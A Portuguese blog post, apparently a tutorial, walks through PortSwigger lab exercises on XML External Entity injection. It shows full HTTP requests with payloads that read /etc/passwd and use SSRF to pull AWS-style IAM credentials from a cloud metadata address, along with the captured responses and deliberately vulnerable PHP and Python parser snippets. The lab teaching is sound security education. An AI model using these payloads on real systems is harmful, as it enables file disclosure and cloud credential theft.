---
title: "XXE Series: Part 1"
categories:
  - papers
  - web hacking
  - owasp
tags:
  - papers
  - ctf
  - owasp
  - XXE
---
## XXE: Simples, porém desastroso...
 
 Mias uma série! Desta vez abordaremos **XML External Entities** ou carinhosamente chamado de **XXE**. Mais um vez, meu intuito aqui não é abordar o que é XML, nem mesmo explicar teoricamente XXE, mas te mostrar de forma prática o que seria e como lidar com essa falha, trabalhando o pensamento ofensivo.

Também não é minha intensão te ensinar a resolver labs. Porém, vou usar alguns aqui para te demonstrar essa falha, caos queira acompanhar (recomendo), deixarei os links dos labs usados no final do paper.. 
### XXE: Aonde ele está?

Antes de qualquer passo, primeiro precisamos pensar: Aonde eu posso encontra-lo? Devemos ter a capacidade analítica de olhar para cada ponto da aplicação e nos questionarmos sobre quais brechas teríamos ali.

É essa capacidade que os difere de ferramentas de scan automáticas. O primeiro passo aqui é **observação ativa** de tudo! No nosso cenário, temos uma aplicação simples até, sem feature de login, temos um cookie para gerenciamento de sessão e nada mais de tão complexo. 

Uma boa fonte de informações sobre a aplicação você encontra nas **requests/respostas** da aplicação.

Porém, temos também um feature de **checagem de estoque**. Feito o reconhecimento inicial, passaremos para pequenos testes manuais.
### XXE: Te encontramos...

Neste momento, batemos olho na request de checagem de estoque e já percebemos nosso possível ponto de entrada para a falha:

```
POST /product/stock HTTP/2
Host: 0ac70014048c0d7c8104483100ed0097.web-security-academy.net
Cookie: session=myt6Wc4aRrHiZSGkXEMq3AEkw1BJpzZp
Content-Length: 107
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac70014048c0d7c8104483100ed0097.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac70014048c0d7c8104483100ed0097.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

Percebeu que até agora você fez usou apenas duas ferramentas? Sendo elas, um web proxy (provavelmente o Burp Suite, mas até a *Networks* do DevTools do seu Browser serviria para isso) e mais poderosa ferramenta que temos: **O Cérebro**.

Bateu o olho em XMl, como forma de transmissão de dados **cliente x servidor**, XXE já me vem a cabeça. Claro, nem sempre tem, mas não custa pensar.

Nesse ponto, nada de automatização, estamos apenas tentando organizar meios e portas de entrada. Como essa aplicação é bem simples e só tem esse ponto aqui, já podemos partir para a etapa de fazer um pequeno teste manual e ver se cola.

Payloads para XXE geralmente seguem a seguinte estrutura básica:

```xml
<!DOCTYPE test [
	 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Inclusive esse eu peguei da resolução da PortSwigger. A parte de entender a estrutura do XML eu deixo para você pesquisar, isso faz parte do nosso trabalho, pesquise.

Mas, em termos simples, com o `DOCTYPE` estamos definido uma nova **entidade que vai ter seu conteúdo vindo de algo externo ao documento XML**, e é aqui que mora o problema.

Veja como seria o ataque usando o payload:

```
POST /product/stock HTTP/2
Host: 0ade009104c68a218395732d002300ab.web-security-academy.net
Cookie: session=vY20VA6mVDAF4clfIRewKN4jLSwX0o40
Content-Length: 178
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ade009104c68a218395732d002300ab.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ade009104c68a218395732d002300ab.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

A resposta:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2338

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
"
```

Aqui é um caso bem simples de XXE. É bater o olho e pensar: *Qual falha se encaixa aqui?* ou se você já tem em mente quais falhas quer tentar encontrar, pense no que precisa para ela ocorrer, se é um XXE, precisa de uma feature com comunicação via xML e etc...

Se não fizer esse trabalho mental, você será como um scanner de vulnerabilidades automatizado, porém, ao invés de código, é composto por veias, artérias, células e por aí vai.
### XXE: e por que isso acontece?

Não pretendo me alongar muito aqui, mas já parou para pensar por que isso acontece?

Isso funciona porque, uma vez a troca de dados feita via XMl, quando a aplicação envia o XML, lá no backend geralmente existe um *parser*. Veja, XML não é apenas texto, e particularmente é um pouco difícil de um ser humano ficar lendo e interpretando XML diretamente, portanto, para isso existe esse parser, para facilitar esse serviço e entregar apenas o essencial interpretando esses dados.

E esse parser acaba por confiar nesse `DOCTYPE` porque esse linha define atributos para o documento XML em questão. É uma relação de confiança.

No backend poderia estar assim, por exemplo:

```php
$xml = simplexml_load_string($input);  
echo $xml->productId;
```

Ou em Python:

```python
from lxml import etree

xml = """<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
"""

root = etree.fromstring(xml)
print(root.find("productId").text)
```

E o principal: o **parser** estar configurado para resolver **entidades externas**. É isso que alavanca e torna possível a falha. Aqui mora o problema.
### XXE + SSRF: Escalando...

Resolvi adicionar essa seção aqui para juntar os dois cenários em um único lugar. Uma vez descobrindo um XXE você pode tenta um **SSRF** e a partir dele tentar descobrir outros ativos e serviços dentro da rede interna.

A request em si não mudo muito. O cenário também não. Creio que a essa altura você já conheça um SSRF. 

O interessante ao achar um XXE poderia ser tentar um SSRF, e poderíamos tentar da seguinte forma:

```
POST /product/stock HTTP/2
Host: 0a0800ef040f212680440ded00a50051.web-security-academy.net
Cookie: session=5JayYxiz0u88J2s4kBfixbZ1xaQGH6xH
Content-Length: 181
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a0800ef040f212680440ded00a50051.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0800ef040f212680440ded00a50051.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

A resposta:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 28

"Invalid product ID: latest"
```

Veja que funcionou. Esse IP nos foi fornecido pela própria PortSwigger.

Nesse caso aqui, poderíamos ir mapeando a aplicação, tentando endpoints, portas e por aí vai. Vai da criatividade e intenção de quem está testando.

Mas o fato é: achou XXE, tente SSRF, pode dar certo e escalar o ataque.

Aqui está um exemplo:

```
POST /product/stock HTTP/2
Host: 0a0800ef040f212680440ded00a50051.web-security-academy.net
Cookie: session=5JayYxiz0u88J2s4kBfixbZ1xaQGH6xH
Content-Length: 228
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a0800ef040f212680440ded00a50051.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0800ef040f212680440ded00a50051.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

A resposta:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-03-24T19:53:29.628610167Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "awBbQ92lT6umd6lrM6ie",
  "SecretAccessKey" : "dKWyOavlVzaYUD6qCj32iKrVwT5X7g2pEh0z5FR8",
  "Token" : "IoDJarst7gqO62sO4nKVWTJKAFRJv5HW4wxVLhTulUvLFeoULdTzmk4QeAwCrhsDU9vy1SULaOpP5AeqIFU6KsHl6Q6ZDfXAqhpaElmbDfQt8st9O2ooLIKjeahr2hYtZUUVbELkj981DiLIEoiqpxA0FLMxcgCDZPDWvV2AFNdEtigai8AdeYixhbZeEk4dvDkCrxMa8g4GELfP5spy310kQwDW15bymza3O8BWibWYRiIeZvx9CgLSEcYVlOFX",
  "Expiration" : "2032-03-22T19:53:29.628610167Z"
}"
```

## No fim...

Esse cenário é bem simples, eu sei, mas serve de base para qualquer outro mais complexo. Nos próximos episódios, os cenários irão mudando em algumas coisas, mas, busque sempre trabalhar essa mentalidade, essa forma de pensar, **é isso que nos difere**.

Em cenários reais isso fará total diferença na busca por falhas, caso você ainda não teve oportunidade de lidar com cenários fora de labs ou CTFs, você perceberá que há um diferença grande ao lidar com cenários reais. É certo que XXE não deixará de ser XXE, XSS não deixará de ser XSS, o que vai contar é a sua capacidade analítica de tentar encaixar a falha no contexto do cenário.

E que mutias vezes uma falha por si só não trará tanto impacto e que portanto, você precisará pensar em formas de escalar o ataque para aumentar o impacto, como foi o caso do SSRF, muito embora o XXE neste cenário já foi impactante.

---
Para saber mais sobre [XXE](https://portswigger.net/web-security/xxe) .
Link dos labs: [Lab 1](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) e [Lab 2](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) .